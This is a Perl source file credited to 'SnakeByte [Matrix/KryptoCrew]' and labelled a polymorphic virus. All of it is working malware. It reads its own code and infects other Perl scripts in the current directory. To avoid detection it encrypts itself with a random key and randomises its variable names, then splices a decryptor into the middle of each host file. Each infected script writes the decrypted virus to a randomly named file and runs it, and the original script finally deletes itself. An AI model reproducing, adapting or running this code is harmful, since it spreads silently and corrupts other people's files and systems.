#!/usr/bin/perl
# 1st Poly Virus by SnakeByte [Matrix/KryptoCrew]   
open(File,$0);@Virus=<File>;close(File);  		# read own code
$Virus=join("", @Virus);foreach $FileName(<*>) {	# get files
if ((-r $FileName) && (-w $FileName) && (-f $FileName)) {	# check file
open(File, "$FileName");@Temp=<File>;close(File);	# open file
if ((@Temp[0] =~ /perl/i ) && ( substr(@Temp[0],0,2) eq "\#!" )) {	# perl file ?
if (( length(@Temp[0]) % 5 ) != 0 ){			# already infected ?
						# first we generate a decryptor

$Key = int(rand(255));					# cryptkey
$crypttype = int(rand(2));				# how to crypt it ?

for ( $X = 0; $X < length($Virus); $X++ ){		# Encrypt it
if ( $crypttype == 0 ){
@Crypt[$X] = (ord(substr($Virus, $X, 1))) * ($Key);	# Multiply
} else {
@Crypt[$X] = (ord(substr($Virus, $X, 1))) + ($Key);	# Addition
}
}

$connectit = chr(int(rand(25)+65));
$VirString = join($connectit, @Crypt);			# all values get seperated by a !
$filename  =  chr(int(rand(25)+65));			# random filename to put virus to
$filename .= int(rand(65535));
 if ( int(rand(2)) == 0 ){ 
  @Vir[0] = "\$l1l = \"$VirString\"\;";
  @Vir[1] = "\$11l = $Key\;";			# key to decrypt
 } else {
  @Vir[0] = "\$11l = $Key\;";			# key to decrypt
  @Vir[1] = "\$l1l = \"$VirString\"\;";
 }
 @Vir[2] = "\@ll1 = split(\"$connectit\", \$l1l)\;";
 @Vir[3] = "for ( \$lll = 0\; \$lll < (\@ll1)\; \$lll++ ) { ";  # Decrypt Loop

 if ( $crypttype == 0 ){
  @Vir[4] = " \$l11 .= chr(\@ll1[\$lll] \/ \$11l)\;"; 	# Decrypt Char
 } else {
  @Vir[4] = " \$l11 .= chr(\@ll1[\$lll]-\$11l)\;";		# Decrypt Char
 }
 @Vir[5] = "}";
 @Vir[6] = "open(1l1, \">$filename\")\;";		# write encrypted
 @Vir[7] = "print 1l1 \$l11\;";			# string to a file
 @Vir[8] = "close(1l1)\;";
 @Vir[9] = "\$lll = \`perl $filename\`;\n";		# and start it

						# change variables
						# $Virus File @Virus $X  $Key $Vir
						# l1l    1l1  ll1    lll 11l  l11
@vars = ("l1l", "1l1", "ll1", "lll", "11l", "l11"); # replace the variables
foreach $replace (@vars){
 $newVar = chr(int(rand(25)+65));			# with a letter
 $newVar .= int(rand(65535));			# and a random number
 for ( $b=0; $b < @Vir; $b++){
  @Vir[$b] =~ s/$replace/$newVar/g ;
 }
}


do {
  chomp @Temp[0];
  @Temp[0] .= " \n";
} until((length(@Temp[0]) % 5) == 0 );


open(File, ">$FileName");			# and write the infected
$Temp = join("\n", @Vir);


for ( $X = ( (@Temp) >> 1 ); $X < @Temp; $X++ ){
  if ( @Temp[$X] =~ "\;\n" ) {		# insert virus in the middle
  $Temp2 = join("", @Temp[0..$X]);		# write first part 
  print File $Temp2;			# and virus
  print File $Temp; $X++;
  $Y = (@Temp);
  $Temp2 = join("", @Temp[$X..$Y]);		# insert rest of the file
  print File $Temp2;
  goto CloseFile;
 }
}

 $Temp2 = join("", @Temp);			# no possibility to insert virus
 print File $Temp;				# file back to disk
 print File $Temp2;				# without EPO


CloseFile:
 close(File);
}}}}

$a = `rm $0`;  				# delete our selves..

